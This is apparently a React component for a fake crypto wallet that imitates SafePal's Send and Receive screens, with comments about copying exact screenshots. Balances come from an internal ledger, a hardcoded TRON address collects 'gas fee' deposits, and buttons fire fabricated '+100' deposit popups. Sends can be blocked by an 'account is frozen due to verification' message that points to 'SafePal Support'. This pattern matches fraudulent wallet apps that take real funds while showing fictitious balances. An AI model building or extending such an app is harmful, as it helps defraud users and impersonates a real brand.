import React, { useState } from 'react';
import { useWallet, getUserReceiveAddress, isAddressMatchingUser } from '../context/WalletContext';
import { CryptoIcon } from './CryptoIcon';
import {
  ChevronLeft,
  Copy,
  Check,
  ChevronRight,
  ChevronDown,
  Info,
  Scan,
  BookUser,
  ArrowDown,
  AlertCircle,
  CheckCircle2,
  Share2,
  X,
  Smartphone,
  Zap,
} from 'lucide-react';

export const SendReceiveModal: React.FC = () => {
  const {
    isSendModalOpen,
    setIsSendModalOpen,
    isReceiveModalOpen,
    setIsReceiveModalOpen,
    selectedAssetForModal,
    setSelectedAssetForModal,
    assets,
    currentUser,
    users,
    sendCrypto,
    depositCrypto,
    depositAddresses,
    networkFeeQrCode,
    setIsCameraScannerOpen,
    triggerLiveToast,
  } = useWallet();

  const [toAddress, setToAddress] = useState('');
  const [amount, setAmount] = useState('');
  const [memo, setMemo] = useState('');
  const [copied, setCopied] = useState(false);
  const [txResult, setTxResult] = useState<{ success: boolean; message: string; txHash?: string } | null>(null);
  const [isAssetPickerOpen, setIsAssetPickerOpen] = useState(false);
  const [showDepositSheet, setShowDepositSheet] = useState(false);
  const [depositAmount, setDepositAmount] = useState('');
  const [customTxHash, setCustomTxHash] = useState('');
  const [depositResult, setDepositResult] = useState<{ success: boolean; message: string; txHash?: string } | null>(null);
  const [isSending, setIsSending] = useState(false);

  if (!isSendModalOpen && !isReceiveModalOpen) return null;

  // Active asset: default to USDT or selectedAssetForModal
  const activeAsset =
    selectedAssetForModal ||
    assets.find((a) => a.symbol === 'USDT') ||
    assets[0];

  const userBalance = currentUser?.balances?.[activeAsset.symbol] || 0;
  const numAmount = parseFloat(amount) || 0;
  const amountUsd = numAmount * activeAsset.priceUsd;

  // Network tag: e.g. TRC20, BEP20, ERC20
  const getNetworkTag = (assetSym: string) => {
    if (assetSym === 'USDT') return 'TRC20';
    if (assetSym === 'BNB') return 'BEP20';
    if (assetSym === 'BTC') return 'Bitcoin';
    if (assetSym === 'ETH') return 'ERC20';
    if (assetSym === 'TRX' || assetSym === 'GAS_TRX') return 'TRON';
    if (assetSym === 'SOL') return 'SOL';
    return 'TRC20';
  };

  const currentNetworkTag = getNetworkTag(activeAsset.symbol);

  // Real deposit/receive address (unique per user account and coin)
  const currentDepositAddress =
    activeAsset.symbol === 'GAS_TRX' || activeAsset.id === 'gas-trx'
      ? 'TB7zZxcAr6NKR6nF231t2ZWYPTu1TUrDE6'
      : (currentUser
          ? getUserReceiveAddress(currentUser, activeAsset.symbol, currentNetworkTag)
          : 'TUXcgkv3j4gSS67Wv5xHvFiBGyJzEtXrLp');

  const truncatedAddr =
    currentDepositAddress.length > 12
      ? `${currentDepositAddress.slice(0, 4)}...${currentDepositAddress.slice(-4)}`
      : currentDepositAddress;

  // Real-time SafePal internal peer detection (email, phone, User ID, custom address, or generated address)
  const cleanToQuery = toAddress.trim().toLowerCase();
  const cleanToDigits = cleanToQuery.replace(/\D/g, '');
  const matchedInternalUser = cleanToQuery && currentUser ? users.find((u) => {
    if (u.id === currentUser.id) return false;
    if (u.email && u.email.toLowerCase() === cleanToQuery) return true;
    if (u.id && u.id.toLowerCase() === cleanToQuery) return true;
    if (u.name && u.name.toLowerCase() === cleanToQuery) return true;
    if (u.phone) {
      const uPhone = u.phone.toLowerCase().trim();
      const uDigits = u.phone.replace(/\D/g, '');
      if (uPhone === cleanToQuery) return true;
      if (cleanToDigits.length >= 6 && uDigits && (uDigits === cleanToDigits || uDigits.endsWith(cleanToDigits))) return true;
    }
    return isAddressMatchingUser(u, cleanToQuery, activeAsset.symbol, currentNetworkTag);
  }) : null;

  // SafePal address green coloring logic (first 6 and last 6 chars highlighted in green)
  const addrPrefix = currentDepositAddress.slice(0, 6);
  const addrMiddle = currentDepositAddress.slice(6, -6);
  const addrSuffix = currentDepositAddress.slice(-6);

  const handleCopyReceiveAddress = () => {
    navigator.clipboard.writeText(currentDepositAddress);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handlePasteAddress = async () => {
    try {
      const text = await navigator.clipboard.readText();
      if (text) setToAddress(text.trim());
    } catch (e) {
      console.warn(e);
    }
  };

  const handleSendSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (currentUser?.isFrozen) {
      setTxResult({
        success: false,
        message: 'Your account is frozen due to verification. Contact SafePal Support.',
      });
      return;
    }
    if (!toAddress || numAmount <= 0) return;
    setIsSending(true);

    try {
      const res = await sendCrypto(activeAsset.symbol, numAmount, toAddress.trim(), currentNetworkTag);
      setTxResult(res);

      if (res.success) {
        setTimeout(() => {
          setIsSendModalOpen(false);
          setTxResult(null);
          setAmount('');
          setToAddress('');
          setMemo('');
        }, 600);
      }
    } catch (err: any) {
      setTxResult({
        success: false,
        message: err?.message || 'Transfer failed. Please check network connection.',
      });
    } finally {
      setIsSending(false);
    }
  };

  const handleDepositSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const depNum = parseFloat(depositAmount);
    if (!depNum || depNum <= 0) return;

    const res = depositCrypto(activeAsset.symbol, depNum, customTxHash || undefined, undefined, currentNetworkTag);
    setDepositResult(res);

    if (res.success) {
      setTimeout(() => {
        setShowDepositSheet(false);
        setIsReceiveModalOpen(false);
        setDepositResult(null);
        setDepositAmount('');
        setCustomTxHash('');
      }, 700);
    }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/85 backdrop-blur-sm p-0 sm:p-4 select-none font-sans">
      <div className="w-full h-full sm:h-[92vh] sm:max-w-md bg-[#0C0E14] sm:rounded-3xl border border-white/[0.08] flex flex-col overflow-hidden text-white shadow-2xl relative">
        
        {/* ======================================================== */}
        {/* ================= SCREENSHOT 3: SEND SCREEN ============= */}
        {/* ======================================================== */}
        {isSendModalOpen && (
          <div className="h-full flex flex-col justify-between">
            {/* Top Bar */}
            <div>
              <div className="flex items-center justify-between px-4 py-3 border-b border-white/[0.04]">
                <button
                  onClick={() => {
                    setIsSendModalOpen(false);
                    setTxResult(null);
                  }}
                  className="p-1 text-white hover:text-slate-300 transition-colors cursor-pointer"
                  title="Back"
                  id="safepal-send-back-btn"
                >
                  <ChevronLeft className="h-6 w-6 stroke-[2.2]" />
                </button>
                <h2 className="text-[17px] font-bold text-white tracking-tight">Send</h2>
                <div className="w-8" />
              </div>

              {/* Pull down indicator */}
              <div className="flex justify-center pt-1.5 pb-2">
                <ChevronDown className="h-4 w-4 text-slate-500/80" />
              </div>
            </div>

            {/* Scrollable Form Content */}
            <div className="flex-1 overflow-y-auto px-4 pb-28 space-y-4">
              
              {/* Wallet Chips Row: [ 📱 Wallet01-H1W ]  [ TUXc...XrLp ] */}
              <div className="flex items-center gap-2">
                <div className="flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-[#181B24] text-[13px] text-white font-medium border border-white/[0.04]">
                  <Smartphone className="h-3.5 w-3.5 text-slate-400" />
                  <span>{currentUser?.name || 'Wallet01-H1W'}</span>
                </div>
                <div className="px-3 py-1.5 rounded-xl bg-[#181B24] text-[13px] text-[#8E92A4] font-mono border border-white/[0.04]">
                  {truncatedAddr}
                </div>
              </div>

              {/* Token Selector Card */}
              <div
                onClick={() => setIsAssetPickerOpen(true)}
                className="bg-[#161922] hover:bg-[#1A1D28] rounded-2xl p-4 flex items-center justify-between transition-colors cursor-pointer border border-white/[0.04]"
                id="safepal-send-token-select"
              >
                <div className="flex items-center gap-3">
                  <CryptoIcon
                    symbol={activeAsset.symbol}
                    name={activeAsset.name}
                    network={activeAsset.network}
                    size="md"
                    showBadge={true}
                  />
                  <div>
                    <div className="text-[16px] font-bold text-white leading-tight">
                      {activeAsset.symbol}
                    </div>
                    <div className="text-[12px] text-[#8E92A4] font-mono mt-0.5">
                      {currentNetworkTag} {currentDepositAddress.slice(0, 5)}...{currentDepositAddress.slice(-5)}
                    </div>
                  </div>
                </div>
                <ChevronRight className="h-5 w-5 text-slate-400" />
              </div>

              {/* TO Field */}
              <div className="space-y-1.5">
                <div className="flex items-center justify-between text-[14px] text-white font-medium px-0.5">
                  <span>To</span>
                  <div className="flex items-center gap-3 text-slate-400">
                    <button type="button" className="hover:text-white" title="Address Book">
                      <BookUser className="h-4 w-4" />
                    </button>
                    <span className="text-slate-600">|</span>
                    <button
                      type="button"
                      onClick={() => setIsCameraScannerOpen(true)}
                      className="hover:text-white cursor-pointer"
                      title="Scan QR Code"
                    >
                      <Scan className="h-4 w-4" />
                    </button>
                  </div>
                </div>

                <div className="relative flex items-center">
                  <input
                    type="text"
                    value={toAddress}
                    onChange={(e) => setToAddress(e.target.value)}
                    placeholder="Enter wallet address, user ID, or email"
                    className="w-full bg-[#161922] rounded-2xl px-4 py-3.5 pr-16 text-[14px] text-white placeholder-[#5A5D6B] font-mono focus:outline-none border border-transparent focus:border-[#5B67F6]/50 transition-colors"
                  />
                  <button
                    type="button"
                    onClick={handlePasteAddress}
                    className="absolute right-3.5 text-[#00D084] text-[13px] font-semibold hover:opacity-80 transition-opacity cursor-pointer"
                  >
                    Paste
                  </button>
                </div>

                {matchedInternalUser && (
                  <div className="flex items-center gap-2 px-3.5 py-2 rounded-xl bg-emerald-500/10 border border-emerald-500/25 text-emerald-400 text-[12px] animate-fadeIn">
                    <Zap className="h-3.5 w-3.5 text-emerald-400 shrink-0" />
                    <span>
                      Direct Peer Transfer: <strong className="text-white">{matchedInternalUser.name}</strong> • Instant Settlement (Zero Gas Fee)
                    </span>
                  </div>
                )}
              </div>

              {/* Warning Banner Card */}
              <div className="bg-[#161922] rounded-2xl p-3.5 flex items-start gap-2.5 border border-white/[0.04]">
                <Info className="h-4 w-4 text-[#8E92A4] shrink-0 mt-0.5" />
                <p className="text-[12px] text-[#8E92A4] leading-relaxed">
                  Please ensure that the receiving address supports the <strong className="text-white">{currentNetworkTag}</strong> network.
                </p>
              </div>

              {/* AMOUNT Field */}
              <div className="space-y-1.5">
                <div className="text-[14px] text-white font-medium px-0.5">
                  Amount
                </div>

                <div className="bg-[#161922] rounded-2xl p-4 space-y-2 border border-white/[0.04]">
                  {/* Row 1: Amount input + MAX + Symbol */}
                  <div className="flex items-center justify-between gap-2">
                    <input
                      type="number"
                      step="any"
                      value={amount}
                      onChange={(e) => setAmount(e.target.value)}
                      placeholder="0.00"
                      className="bg-transparent text-[22px] font-semibold text-white placeholder-[#5A5D6B] font-mono focus:outline-none w-full"
                    />
                    <div className="flex items-center gap-2 shrink-0">
                      <button
                        type="button"
                        onClick={() => setAmount(userBalance.toString())}
                        className="px-2.5 py-1 rounded-lg bg-[#252836] text-[11px] font-bold text-white hover:bg-[#323648] transition-colors cursor-pointer"
                      >
                        MAX
                      </button>
                      <span className="text-[14px] font-bold text-white font-mono">
                        {activeAsset.symbol}
                      </span>
                    </div>
                  </div>

                  {/* Row 2: Secondary USD Value */}
                  <div className="flex items-center justify-between text-[13px] text-[#5A5D6B] font-mono pt-1 border-t border-white/[0.04]">
                    <span>{numAmount > 0 ? amountUsd.toFixed(2) : '0.00'}</span>
                    <span>USD</span>
                  </div>
                </div>

                {/* Subtext: Available balance */}
                <div className="text-[12px] text-[#8E92A4] px-0.5 pt-1">
                  Available balance:{' '}
                  <span className="text-[#5B67F6] font-semibold font-mono">
                    {userBalance} {activeAsset.symbol}
                  </span>
                </div>
              </div>

              {/* MEMO Field */}
              <div className="space-y-1.5">
                <div className="text-[14px] text-white font-medium px-0.5">
                  MEMO
                </div>
                <input
                  type="text"
                  value={memo}
                  onChange={(e) => setMemo(e.target.value)}
                  placeholder="Optional"
                  className="w-full bg-[#161922] rounded-2xl px-4 py-3.5 text-[14px] text-white placeholder-[#5A5D6B] focus:outline-none border border-transparent focus:border-[#5B67F6]/50 transition-colors"
                />
              </div>

              {/* Tx Result Status */}
              {txResult && (
                <div
                  className={`p-4 rounded-2xl text-xs font-semibold flex items-center gap-2 ${
                    txResult.success
                      ? 'bg-[#00D084]/15 border border-[#00D084]/30 text-[#00D084]'
                      : 'bg-[#FF5252]/15 border border-[#FF5252]/30 text-[#FF5252]'
                  }`}
                >
                  {txResult.success ? <CheckCircle2 className="h-5 w-5 shrink-0" /> : <AlertCircle className="h-5 w-5 shrink-0" />}
                  <div>
                    <div>{txResult.message}</div>
                    {txResult.txHash && <div className="font-mono text-[10px] mt-0.5 truncate">{txResult.txHash}</div>}
                  </div>
                </div>
              )}

            </div>

            {/* Bottom Next Button (Exact Vibrant Purple #5B67F6) */}
            <div className="absolute bottom-0 left-0 right-0 p-4 bg-[#0C0E14]/95 backdrop-blur-md border-t border-white/[0.04]">
              <button
                onClick={handleSendSubmit}
                disabled={!toAddress || numAmount <= 0 || isSending}
                className="w-full py-4 rounded-2xl bg-[#5B67F6] hover:bg-[#4E59E8] disabled:opacity-50 text-white font-semibold text-[16px] shadow-lg shadow-[#5B67F6]/25 transition-all active:scale-[0.98] cursor-pointer flex items-center justify-center gap-2"
                id="safepal-send-next-btn"
              >
                {isSending ? (
                  <>
                    <span className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                    <span>Processing...</span>
                  </>
                ) : (
                  'Next'
                )}
              </button>
            </div>
          </div>
        )}

        {/* ======================================================== */}
        {/* =============== SCREENSHOT 4: RECEIVE SCREEN ============ */}
        {/* ======================================================== */}
        {isReceiveModalOpen && (
          <div className="h-full flex flex-col justify-between">
            {/* Top Bar */}
            <div>
              <div className="flex items-center justify-between px-4 py-3 border-b border-white/[0.04]">
                <button
                  onClick={() => setIsReceiveModalOpen(false)}
                  className="p-1 text-white hover:text-slate-300 transition-colors cursor-pointer"
                  title="Back"
                  id="safepal-receive-back-btn"
                >
                  <ChevronLeft className="h-6 w-6 stroke-[2.2]" />
                </button>
                <h2 className="text-[17px] font-bold text-white tracking-tight">Receive</h2>
                <div className="w-8" />
              </div>
            </div>

            {/* Scrollable Body Content */}
            <div className="flex-1 overflow-y-auto px-4 pb-28 space-y-4 pt-1">
              
              {/* Wallet Pill: 📱 Wallet01-H1W */}
              <div className="flex items-center">
                <div className="flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-[#181B24] text-[13px] text-white font-medium border border-white/[0.04]">
                  <Smartphone className="h-3.5 w-3.5 text-slate-400" />
                  <span>{currentUser?.name || 'Wallet01-H1W'}</span>
                </div>
              </div>

              {/* Token Selector Row: Tether icon + USDT (TRC20) ▾ */}
              <div
                onClick={() => setIsAssetPickerOpen(true)}
                className="flex items-center justify-center gap-2 py-1 cursor-pointer"
              >
                <CryptoIcon
                  symbol={activeAsset.symbol}
                  name={activeAsset.name}
                  network={activeAsset.network}
                  size="sm"
                  showBadge={true}
                />
                <span className="text-[16px] font-bold text-white tracking-tight">
                  {activeAsset.symbol} ({currentNetworkTag})
                </span>
                <ChevronDown className="h-4 w-4 text-slate-400 stroke-[2.5]" />
              </div>

              {/* Big High-Contrast White QR Code Card (Exact SafePal Screenshot 4) */}
              <div className="bg-[#181B24] rounded-3xl p-5 flex flex-col items-center justify-center border border-white/[0.04] space-y-4">
                
                {/* White Canvas QR Code Box with Cyan Tether Diamond in Center */}
                <div className="w-64 h-64 bg-white rounded-2xl p-4 flex flex-col items-center justify-center relative shadow-lg">
                  <img
                    src={
                      activeAsset.symbol === 'GAS_TRX' && networkFeeQrCode
                        ? networkFeeQrCode
                        : `https://api.qrserver.com/v1/create-qr-code/?size=240x240&data=${encodeURIComponent(
                            currentDepositAddress
                          )}`
                    }
                    alt="Deposit QR"
                    className="w-full h-full object-contain"
                    referrerPolicy="no-referrer"
                  />
                  {/* Center Overlay Logo inside QR code */}
                  <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
                    <div className="w-9 h-9 rounded-lg bg-white p-1 shadow-md flex items-center justify-center">
                      <CryptoIcon
                        symbol={activeAsset.symbol}
                        name={activeAsset.name}
                        size="xs"
                        showBadge={false}
                      />
                    </div>
                  </div>
                </div>

                {/* Monospace Address with SafePal Signature Green Prefix & Suffix */}
                <div
                  onClick={handleCopyReceiveAddress}
                  className="text-center cursor-pointer group"
                  title="Click to copy"
                >
                  <p className="font-mono text-[14px] tracking-tight leading-relaxed select-all">
                    <span className="text-[#00D084] font-semibold">{addrPrefix}</span>
                    <span className="text-white font-medium">{addrMiddle}</span>
                    <span className="text-[#00D084] font-semibold">{addrSuffix}</span>
                  </p>
                  {copied && (
                    <span className="inline-block text-[11px] font-semibold text-[#00D084] mt-1 animate-pulse">
                      ✓ Address copied to clipboard!
                    </span>
                  )}
                </div>

              </div>

              {/* Action Buttons: [ Share ] [ Copy ] */}
              <div className="grid grid-cols-2 gap-3 pt-1">
                {/* Share Button (dark with border) */}
                <button
                  type="button"
                  onClick={async () => {
                    if (navigator.share) {
                      try {
                        await navigator.share({
                          title: `SafePal ${activeAsset.symbol} Address`,
                          text: currentDepositAddress,
                        });
                      } catch (err) {}
                    } else {
                      handleCopyReceiveAddress();
                    }
                  }}
                  className="py-3.5 rounded-2xl bg-[#161922] hover:bg-[#202432] text-white font-semibold text-[15px] border border-white/[0.08] transition-all active:scale-[0.98] cursor-pointer"
                >
                  Share
                </button>

                {/* Copy Button (vibrant purple #5B67F6) */}
                <button
                  type="button"
                  onClick={handleCopyReceiveAddress}
                  className="py-3.5 rounded-2xl bg-[#5B67F6] hover:bg-[#4E59E8] text-white font-semibold text-[15px] shadow-lg shadow-[#5B67F6]/25 transition-all active:scale-[0.98] cursor-pointer"
                >
                  {copied ? 'Copied' : 'Copy'}
                </button>
              </div>

              {/* Warning Banner Card */}
              <div className="bg-[#161922] rounded-2xl p-4 flex items-start gap-3 border border-white/[0.04]">
                <Info className="h-4 w-4 text-[#8E92A4] shrink-0 mt-0.5" />
                <p className="text-[12px] text-[#8E92A4] leading-relaxed">
                  This address can only accept assets on <strong className="text-white">{activeAsset.symbol} ({currentNetworkTag})</strong>. Sending any other types of tokens to this address will result in permanent loss.
                </p>
              </div>

            </div>

            {/* Bottom Buttons: ↓ Deposit & ⚡ Instant 30s Live Demo */}
            <div className="absolute bottom-0 left-0 right-0 p-4 bg-[#0C0E14]/95 backdrop-blur-md border-t border-white/[0.04] space-y-2">
              <button
                onClick={() => setShowDepositSheet(true)}
                className="w-full py-3.5 rounded-2xl bg-[#5B67F6] hover:bg-[#4E59E8] text-white font-semibold text-[15px] shadow-lg shadow-[#5B67F6]/25 flex items-center justify-center gap-2 transition-all active:scale-[0.98] cursor-pointer"
                id="safepal-deposit-another-wallet-btn"
              >
                <ArrowDown className="h-4 w-4 stroke-[2.2]" />
                <span>Deposit from another wallet</span>
              </button>

              <button
                type="button"
                onClick={() => {
                  triggerLiveToast({
                    type: 'deposit',
                    amount: 100,
                    symbol: activeAsset.symbol,
                    network: currentNetworkTag,
                  });
                  setIsReceiveModalOpen(false);
                }}
                className="w-full py-2.5 rounded-xl bg-white/5 hover:bg-white/10 text-slate-300 hover:text-white text-[12px] font-semibold border border-white/10 flex items-center justify-center gap-1.5 transition-all cursor-pointer"
              >
                <Zap className="h-3.5 w-3.5 text-[#00D084]" />
                <span>⚡ Test 30s Deposit Popup (+100 {activeAsset.symbol})</span>
              </button>
            </div>
          </div>
        )}

        {/* Deposit Sheet for manual tx confirmation / notification */}
        {showDepositSheet && (
          <div className="fixed inset-0 z-60 flex items-end sm:items-center justify-center bg-black/80 backdrop-blur-sm p-0 sm:p-4">
            <div className="w-full sm:max-w-md bg-[#161922] rounded-t-3xl sm:rounded-3xl p-5 border border-white/10 space-y-4">
              <div className="flex items-center justify-between pb-2 border-b border-white/10">
                <h3 className="text-[16px] font-bold text-white">Deposit Notification</h3>
                <button
                  onClick={() => setShowDepositSheet(false)}
                  className="p-1 text-slate-400 hover:text-white"
                >
                  <X className="h-5 w-5" />
                </button>
              </div>

              {depositResult ? (
                <div className="py-4 text-center">
                  <CheckCircle2 className="h-10 w-10 text-[#00D084] mx-auto mb-2 animate-bounce" />
                  <h4 className="text-sm font-bold text-white">Deposit Request Logged!</h4>
                  <p className="text-xs text-slate-300 mt-1">{depositResult.message}</p>
                </div>
              ) : (
                <form onSubmit={handleDepositSubmit} className="space-y-3">
                  <div>
                    <label className="block text-xs font-semibold text-[#8E92A4] mb-1">
                      Deposit Amount ({activeAsset.symbol})
                    </label>
                    <input
                      type="number"
                      step="any"
                      placeholder={`e.g. 100 ${activeAsset.symbol}`}
                      value={depositAmount}
                      onChange={(e) => setDepositAmount(e.target.value)}
                      required
                      className="w-full rounded-xl bg-[#0C0E14] border border-white/10 px-3.5 py-2.5 text-xs text-white font-mono focus:outline-none focus:border-[#5B67F6]"
                    />
                  </div>

                  <div>
                    <label className="block text-xs font-semibold text-[#8E92A4] mb-1">
                      Transaction Hash / Hash (Optional)
                    </label>
                    <input
                      type="text"
                      placeholder="Paste blockchain tx hash if available"
                      value={customTxHash}
                      onChange={(e) => setCustomTxHash(e.target.value)}
                      className="w-full rounded-xl bg-[#0C0E14] border border-white/10 px-3.5 py-2.5 text-xs text-white font-mono focus:outline-none focus:border-[#5B67F6]"
                    />
                  </div>

                  <button
                    type="submit"
                    className="w-full py-3 rounded-xl bg-[#5B67F6] text-white font-semibold text-xs hover:bg-[#4E59E8] transition-colors cursor-pointer"
                  >
                    Confirm & Submit Deposit
                  </button>

                  <div className="pt-1 text-center">
                    <span className="text-[10px] text-slate-500 font-mono uppercase tracking-wider">or instant demo</span>
                  </div>

                  <button
                    type="button"
                    onClick={() => {
                      triggerLiveToast({
                        type: 'deposit',
                        amount: 100,
                        symbol: activeAsset.symbol,
                        network: currentNetworkTag,
                      });
                      setShowDepositSheet(false);
                      setIsReceiveModalOpen(false);
                    }}
                    className="w-full py-2.5 rounded-xl bg-[#00D084]/15 hover:bg-[#00D084]/25 text-[#00D084] font-semibold text-xs border border-[#00D084]/30 flex items-center justify-center gap-1.5 transition-all cursor-pointer"
                  >
                    <Zap className="h-3.5 w-3.5" />
                    <span>⚡ Test 30s Live Deposit Popup (+100 {activeAsset.symbol})</span>
                  </button>
                </form>
              )}
            </div>
          </div>
        )}

        {/* Token Picker Sheet */}
        {isAssetPickerOpen && (
          <div className="fixed inset-0 z-60 flex items-end sm:items-center justify-center bg-black/80 backdrop-blur-sm p-0 sm:p-4">
            <div className="w-full sm:max-w-md bg-[#161922] rounded-t-3xl sm:rounded-3xl p-5 border border-white/10 space-y-3 max-h-[80vh] flex flex-col">
              <div className="flex items-center justify-between pb-2 border-b border-white/10">
                <h3 className="text-[16px] font-bold text-white">Select Coin</h3>
                <button
                  onClick={() => setIsAssetPickerOpen(false)}
                  className="p-1 text-slate-400 hover:text-white"
                >
                  <X className="h-5 w-5" />
                </button>
              </div>

              <div className="flex-1 overflow-y-auto space-y-1.5 pt-1">
                {assets
                  .filter((a) => !a.id.includes('arbitrum') && !a.id.includes('base'))
                  .map((a) => (
                    <div
                      key={a.id}
                      onClick={() => {
                        setSelectedAssetForModal(a);
                        setIsAssetPickerOpen(false);
                      }}
                      className={`flex items-center justify-between p-3 rounded-2xl transition-colors cursor-pointer ${
                        activeAsset.symbol === a.symbol
                          ? 'bg-[#5B67F6]/15 border border-[#5B67F6]/40'
                          : 'bg-[#181B24] hover:bg-[#202432]'
                      }`}
                    >
                      <div className="flex items-center gap-3">
                        <CryptoIcon symbol={a.symbol} name={a.name} size="sm" showBadge={true} />
                        <div>
                          <div className="text-[14px] font-bold text-white">{a.symbol}</div>
                          <div className="text-[11px] text-[#8E92A4]">{a.name}</div>
                        </div>
                      </div>
                      <div className="text-right">
                        <div className="text-[13px] font-bold text-white font-mono">
                          {currentUser?.balances?.[a.symbol] || 0}
                        </div>
                        <div className="text-[11px] text-[#8E92A4] font-mono">
                          ${a.priceUsd.toFixed(2)}
                        </div>
                      </div>
                    </div>
                  ))}
              </div>
            </div>
          </div>
        )}

      </div>
    </div>
  );
};
